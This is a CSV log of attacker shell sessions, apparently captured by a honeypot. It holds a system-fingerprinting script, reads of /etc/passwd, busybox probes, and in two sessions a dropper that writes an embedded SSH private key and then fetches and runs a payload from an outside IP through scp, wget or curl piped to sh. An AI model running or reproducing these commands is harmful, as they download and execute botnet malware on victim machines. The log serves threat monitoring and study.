timestamp,src_ip,session,input,failed
2026-09-01 06:15:15.196037+00:00,195.178.110.232,e485c6c29499,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '""' ) || echo """"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q ""lm"" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 8"" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 7"" /proc/cpuinfo && echo armv7l ) || echo """"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c ""^processor"" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E ""^model name"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E ""^Hardware"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' ""$out"" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo ""UNAME:$uname""; echo ""ARCH:$arch""; echo ""UPTIME:$uptime""; echo ""CPUS:$cpus""; echo ""CPU_MODEL:$cpu_model""; echo ""GPU:$gpu_info""; echo ""LAST:$last_output""; echo ""FILTER:$filter_output""",False
2026-09-01 06:15:15.197311+00:00,195.178.110.232,e485c6c29499,uname -s -v -n -m 2 > /dev/null,False
2026-09-01 06:15:15.198323+00:00,195.178.110.232,e485c6c29499,/bin/uname -s -v -n -m 2 > /dev/null,False
2026-09-01 06:15:15.199098+00:00,195.178.110.232,e485c6c29499,/usr/bin/uname -s -v -n -m 2 > /dev/null,False
2026-09-01 06:15:15.202147+00:00,195.178.110.232,e485c6c29499,busybox uname -s -v -n -m 2 > /dev/null,False
2026-09-01 06:15:15.203140+00:00,195.178.110.232,e485c6c29499,busybox uname -s -v -n -m,True
2026-09-01 06:15:15.204257+00:00,195.178.110.232,e485c6c29499,( [ -f /proc/version ],False
2026-09-01 06:15:15.205207+00:00,195.178.110.232,e485c6c29499,[ -f /proc/version ],False
2026-09-01 06:15:15.207387+00:00,195.178.110.232,e485c6c29499,head -1 /proc/version | cut -d -f1,False
2026-09-01 06:15:15.209597+00:00,195.178.110.232,e485c6c29499,[ -f /etc/os-release ],False
2026-09-01 07:43:59.195554+00:00,192.236.225.165,8e09f0e86d33,id,False
2026-09-01 07:43:59.198916+00:00,192.236.225.165,8e09f0e86d33,cat /etc/passwd,False
2026-09-01 07:43:59.204269+00:00,192.236.225.165,8e09f0e86d33,"echo -e ""\x61\x75\x74\x68\x5F\x6F\x6B\x0A""",False
2026-09-01 07:44:00.528472+00:00,192.236.225.165,8e09f0e86d33,enable,False
2026-09-01 07:44:00.530322+00:00,192.236.225.165,8e09f0e86d33,enable ,True
2026-09-01 07:44:00.531526+00:00,192.236.225.165,8e09f0e86d33,system,False
2026-09-01 07:44:00.532539+00:00,192.236.225.165,8e09f0e86d33,system ,True
2026-09-01 07:44:00.534537+00:00,192.236.225.165,8e09f0e86d33,shell,False
2026-09-01 07:44:00.537286+00:00,192.236.225.165,8e09f0e86d33,shell ,True
2026-09-01 07:44:00.538837+00:00,192.236.225.165,8e09f0e86d33,sh,False
2026-09-01 07:44:00.541597+00:00,192.236.225.165,8e09f0e86d33,bash,False
2026-09-01 07:44:00.549392+00:00,192.236.225.165,8e09f0e86d33,cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----,False
2026-09-01 07:44:00.556987+00:00,192.236.225.165,8e09f0e86d33,b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW,False
2026-09-01 07:44:00.559170+00:00,192.236.225.165,8e09f0e86d33,b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW ,True
2026-09-01 07:44:00.564287+00:00,192.236.225.165,8e09f0e86d33,QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ,False
2026-09-01 07:44:00.566095+00:00,192.236.225.165,8e09f0e86d33,QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ ,True
2026-09-01 07:44:00.571566+00:00,192.236.225.165,8e09f0e86d33,0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg,False
2026-09-01 07:44:00.572633+00:00,192.236.225.165,8e09f0e86d33,0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg ,True
2026-09-01 07:44:00.577981+00:00,192.236.225.165,8e09f0e86d33,AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9,False
2026-09-01 07:44:00.579852+00:00,192.236.225.165,8e09f0e86d33,AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9 ,True
2026-09-01 07:44:00.583567+00:00,192.236.225.165,8e09f0e86d33,Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=,False
2026-09-01 07:44:00.589131+00:00,192.236.225.165,8e09f0e86d33,-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no,False
2026-09-01 07:44:00.591074+00:00,192.236.225.165,8e09f0e86d33,-----END OPENSSH PRIVATE KEY----- > key.ppk; echo StrictHostKeyChecking no,True
2026-09-01 07:44:00.618001+00:00,192.236.225.165,8e09f0e86d33,"UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e ""\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B""",False
2026-09-01 07:44:00.621003+00:00,192.236.225.165,8e09f0e86d33,,False
2026-09-01 09:03:39.486460+00:00,8.216.32.107,a9e621c14c07,id,False
2026-09-01 09:03:39.488479+00:00,8.216.32.107,a9e621c14c07,cat /etc/passwd,False
2026-09-01 09:03:39.492288+00:00,8.216.32.107,a9e621c14c07,"echo -e ""\x61\x75\x74\x68\x5F\x6F\x6B\x0A""",False
2026-09-01 09:03:40.523556+00:00,8.216.32.107,a9e621c14c07,enable,False
2026-09-01 09:03:40.524260+00:00,8.216.32.107,a9e621c14c07,enable ,True
2026-09-01 09:03:40.525128+00:00,8.216.32.107,a9e621c14c07,system,False
2026-09-01 09:03:40.526077+00:00,8.216.32.107,a9e621c14c07,system ,True
2026-09-01 09:03:40.527013+00:00,8.216.32.107,a9e621c14c07,shell,False
2026-09-01 09:03:40.527648+00:00,8.216.32.107,a9e621c14c07,shell ,True
2026-09-01 09:03:40.528236+00:00,8.216.32.107,a9e621c14c07,sh,False
2026-09-01 09:03:40.528998+00:00,8.216.32.107,a9e621c14c07,bash,False
2026-09-01 09:03:40.533042+00:00,8.216.32.107,a9e621c14c07,cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----,False
2026-09-01 09:03:40.539037+00:00,8.216.32.107,a9e621c14c07,b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW,False
2026-09-01 09:03:40.540371+00:00,8.216.32.107,a9e621c14c07,b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW ,True
2026-09-01 09:03:40.545769+00:00,8.216.32.107,a9e621c14c07,QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ,False
2026-09-01 09:03:40.547046+00:00,8.216.32.107,a9e621c14c07,QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ ,True
2026-09-01 09:03:40.552535+00:00,8.216.32.107,a9e621c14c07,0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg,False
2026-09-01 09:03:40.553991+00:00,8.216.32.107,a9e621c14c07,0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg ,True
2026-09-01 09:03:40.559458+00:00,8.216.32.107,a9e621c14c07,AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9,False
2026-09-01 09:03:40.560763+00:00,8.216.32.107,a9e621c14c07,AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9 ,True
2026-09-01 09:03:40.564626+00:00,8.216.32.107,a9e621c14c07,Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=,False
2026-09-01 09:03:40.570781+00:00,8.216.32.107,a9e621c14c07,-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no,False
2026-09-01 09:03:40.572159+00:00,8.216.32.107,a9e621c14c07,-----END OPENSSH PRIVATE KEY----- > key.ppk; echo StrictHostKeyChecking no,True
2026-09-01 09:03:40.591970+00:00,8.216.32.107,a9e621c14c07,"UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e ""\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B""",False
2026-09-01 09:03:40.593713+00:00,8.216.32.107,a9e621c14c07,,False
2026-09-01 09:04:45.723433+00:00,14.1.104.110,15741ae29084,start,False
2026-09-01 09:04:45.724110+00:00,14.1.104.110,15741ae29084,start ,True
2026-09-01 09:04:45.725121+00:00,14.1.104.110,15741ae29084,enable,False
2026-09-01 09:04:45.726066+00:00,14.1.104.110,15741ae29084,enable ,True
2026-09-01 09:04:45.727453+00:00,14.1.104.110,15741ae29084,config terminal,False
2026-09-01 09:04:45.728513+00:00,14.1.104.110,15741ae29084,config terminal,True
2026-09-01 09:04:45.729447+00:00,14.1.104.110,15741ae29084,system,False
2026-09-01 09:04:45.730320+00:00,14.1.104.110,15741ae29084,system ,True
2026-09-01 09:04:45.731678+00:00,14.1.104.110,15741ae29084,linuxshell,False
2026-09-01 09:04:45.732634+00:00,14.1.104.110,15741ae29084,linuxshell ,True
2026-09-01 09:04:45.733378+00:00,14.1.104.110,15741ae29084,su,False
2026-09-01 09:04:45.734959+00:00,14.1.104.110,15741ae29084,shell,False
2026-09-01 09:04:45.735969+00:00,14.1.104.110,15741ae29084,shell ,True
2026-09-01 09:04:45.736657+00:00,14.1.104.110,15741ae29084,sh,False
2026-09-01 09:04:45.747914+00:00,14.1.104.110,15741ae29084,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x50\x43\x41\x57\x45\x58',False
2026-09-01 09:04:45.752993+00:00,14.1.104.110,15741ae29084,/bin/busybox echo -e \x50\x43\x41\x57\x45\x58,True
2026-09-01 09:05:07.103308+00:00,14.1.104.110,5cb530f13d1f,start,False
2026-09-01 09:05:07.104438+00:00,14.1.104.110,5cb530f13d1f,start ,True
2026-09-01 09:05:07.105892+00:00,14.1.104.110,5cb530f13d1f,enable,False
2026-09-01 09:05:07.107012+00:00,14.1.104.110,5cb530f13d1f,enable ,True
2026-09-01 09:05:07.109838+00:00,14.1.104.110,5cb530f13d1f,config terminal,False
2026-09-01 09:05:07.110880+00:00,14.1.104.110,5cb530f13d1f,config terminal,True
2026-09-01 09:05:07.112017+00:00,14.1.104.110,5cb530f13d1f,system,False
2026-09-01 09:05:07.112922+00:00,14.1.104.110,5cb530f13d1f,system ,True
2026-09-01 09:05:07.114229+00:00,14.1.104.110,5cb530f13d1f,linuxshell,False
2026-09-01 09:05:07.115130+00:00,14.1.104.110,5cb530f13d1f,linuxshell ,True
2026-09-01 09:05:07.117621+00:00,14.1.104.110,5cb530f13d1f,su,False
2026-09-01 09:05:07.119273+00:00,14.1.104.110,5cb530f13d1f,shell,False
2026-09-01 09:05:07.120212+00:00,14.1.104.110,5cb530f13d1f,shell ,True
2026-09-01 09:05:07.120884+00:00,14.1.104.110,5cb530f13d1f,sh,False
2026-09-01 09:05:07.140108+00:00,14.1.104.110,5cb530f13d1f,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x50\x43\x41\x57\x45\x58',False
2026-09-01 09:05:07.145278+00:00,14.1.104.110,5cb530f13d1f,/bin/busybox echo -e \x50\x43\x41\x57\x45\x58,True
2026-09-01 09:05:33.389077+00:00,14.1.104.110,13864db67548,start,False
2026-09-01 09:05:33.390160+00:00,14.1.104.110,13864db67548,start ,True
2026-09-01 09:05:33.391229+00:00,14.1.104.110,13864db67548,enable,False
2026-09-01 09:05:33.392045+00:00,14.1.104.110,13864db67548,enable ,True
2026-09-01 09:05:33.393368+00:00,14.1.104.110,13864db67548,config terminal,False
2026-09-01 09:05:33.394371+00:00,14.1.104.110,13864db67548,config terminal,True
2026-09-01 09:05:33.395308+00:00,14.1.104.110,13864db67548,system,False
2026-09-01 09:05:33.396133+00:00,14.1.104.110,13864db67548,system ,True
2026-09-01 09:05:33.397364+00:00,14.1.104.110,13864db67548,linuxshell,False
2026-09-01 09:05:33.398008+00:00,14.1.104.110,13864db67548,linuxshell ,True
2026-09-01 09:05:33.398548+00:00,14.1.104.110,13864db67548,su,False
2026-09-01 09:05:33.399933+00:00,14.1.104.110,13864db67548,shell,False
2026-09-01 09:05:33.400789+00:00,14.1.104.110,13864db67548,shell ,True
2026-09-01 09:05:33.401533+00:00,14.1.104.110,13864db67548,sh,False
2026-09-01 09:05:33.412122+00:00,14.1.104.110,13864db67548,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x50\x43\x41\x57\x45\x58',False
2026-09-01 09:05:33.417123+00:00,14.1.104.110,13864db67548,/bin/busybox echo -e \x50\x43\x41\x57\x45\x58,True
2026-09-01 09:05:47.250295+00:00,14.1.104.110,4bba9885a544,start,False
2026-09-01 09:05:47.251251+00:00,14.1.104.110,4bba9885a544,start ,True
2026-09-01 09:05:47.252188+00:00,14.1.104.110,4bba9885a544,enable,False
2026-09-01 09:05:47.253152+00:00,14.1.104.110,4bba9885a544,enable ,True
2026-09-01 09:05:47.254705+00:00,14.1.104.110,4bba9885a544,config terminal,False
2026-09-01 09:05:47.255300+00:00,14.1.104.110,4bba9885a544,config terminal,True
2026-09-01 09:05:47.255941+00:00,14.1.104.110,4bba9885a544,system,False
2026-09-01 09:05:47.256460+00:00,14.1.104.110,4bba9885a544,system ,True
2026-09-01 09:05:47.257664+00:00,14.1.104.110,4bba9885a544,linuxshell,False
2026-09-01 09:05:47.258542+00:00,14.1.104.110,4bba9885a544,linuxshell ,True
2026-09-01 09:05:47.259359+00:00,14.1.104.110,4bba9885a544,su,False
2026-09-01 09:05:47.260798+00:00,14.1.104.110,4bba9885a544,shell,False
2026-09-01 09:05:47.261491+00:00,14.1.104.110,4bba9885a544,shell ,True
2026-09-01 09:05:47.262092+00:00,14.1.104.110,4bba9885a544,sh,False
2026-09-01 09:05:47.272157+00:00,14.1.104.110,4bba9885a544,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x50\x43\x41\x57\x45\x58',False
2026-09-01 09:05:47.278298+00:00,14.1.104.110,4bba9885a544,/bin/busybox echo -e \x50\x43\x41\x57\x45\x58,True
2026-09-01 10:39:24.043128+00:00,213.55.245.89,6fe4fe3fd429,enable,False
2026-09-01 10:39:24.052608+00:00,213.55.245.89,6fe4fe3fd429,enable ,True
2026-09-01 11:00:53.632730+00:00,5.254.249.187,a84175327aba,start,False
2026-09-01 11:00:53.634056+00:00,5.254.249.187,a84175327aba,start ,True
2026-09-01 11:00:53.635299+00:00,5.254.249.187,a84175327aba,enable,False
2026-09-01 11:00:53.637697+00:00,5.254.249.187,a84175327aba,enable ,True
2026-09-01 11:00:53.639455+00:00,5.254.249.187,a84175327aba,config terminal,False
2026-09-01 11:00:53.642672+00:00,5.254.249.187,a84175327aba,config terminal,True
2026-09-01 11:00:53.644282+00:00,5.254.249.187,a84175327aba,system,False
2026-09-01 11:00:53.645394+00:00,5.254.249.187,a84175327aba,system ,True
2026-09-01 11:00:53.656698+00:00,5.254.249.187,a84175327aba,linuxshell,False
2026-09-01 11:00:53.657654+00:00,5.254.249.187,a84175327aba,linuxshell ,True
2026-09-01 11:00:53.658655+00:00,5.254.249.187,a84175327aba,su,False
2026-09-01 11:00:53.662288+00:00,5.254.249.187,a84175327aba,shell,False
2026-09-01 11:00:53.663348+00:00,5.254.249.187,a84175327aba,shell ,True
2026-09-01 11:00:53.664410+00:00,5.254.249.187,a84175327aba,sh,False
2026-09-01 11:00:53.676955+00:00,5.254.249.187,a84175327aba,>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x48\x52\x50\x46\x45\x5a',False
2026-09-01 11:00:53.687766+00:00,5.254.249.187,a84175327aba,/bin/busybox echo -e \x48\x52\x50\x46\x45\x5a,True
2026-09-01 11:07:55.391812+00:00,114.251.133.66,04b2a406a7b6,uname -s -m,False
2026-09-01 12:05:54.530532+00:00,195.178.110.227,8955c2d9e63e,"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '""' ) || echo """"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q ""lm"" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 8"" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q ""CPU architecture: 7"" /proc/cpuinfo && echo armv7l ) || echo """"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c ""^processor"" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E ""^model name"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E ""^Hardware"" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf ""#!/bin/bash\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case ""$out"" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf ""#!/bin/sh\necho \""xxxxxx\""\n"" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' ""$out"" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo ""UNAME:$uname""; echo ""ARCH:$arch""; echo ""UPTIME:$uptime""; echo ""CPUS:$cpus""; echo ""CPU_MODEL:$cpu_model""; echo ""GPU:$gpu_info""; echo ""LAST:$last_output""; echo ""FILTER:$filter_output""",False
2026-09-01 12:05:54.533015+00:00,195.178.110.227,8955c2d9e63e,uname -s -v -n -m 2 > /dev/null,False
2026-09-01 12:05:54.534696+00:00,195.178.110.227,8955c2d9e63e,/bin/uname -s -v -n -m 2 > /dev/null,False
2026-09-01 12:05:54.537060+00:00,195.178.110.227,8955c2d9e63e,/usr/bin/uname -s -v -n -m 2 > /dev/null,False
2026-09-01 12:05:54.544635+00:00,195.178.110.227,8955c2d9e63e,busybox uname -s -v -n -m 2 > /dev/null,False
2026-09-01 12:05:54.545713+00:00,195.178.110.227,8955c2d9e63e,busybox uname -s -v -n -m,True
2026-09-01 12:05:54.547099+00:00,195.178.110.227,8955c2d9e63e,( [ -f /proc/version ],False
2026-09-01 12:05:54.547753+00:00,195.178.110.227,8955c2d9e63e,[ -f /proc/version ],False
2026-09-01 12:05:54.549950+00:00,195.178.110.227,8955c2d9e63e,head -1 /proc/version | cut -d -f1,False
2026-09-01 12:05:54.552355+00:00,195.178.110.227,8955c2d9e63e,[ -f /etc/os-release ],False
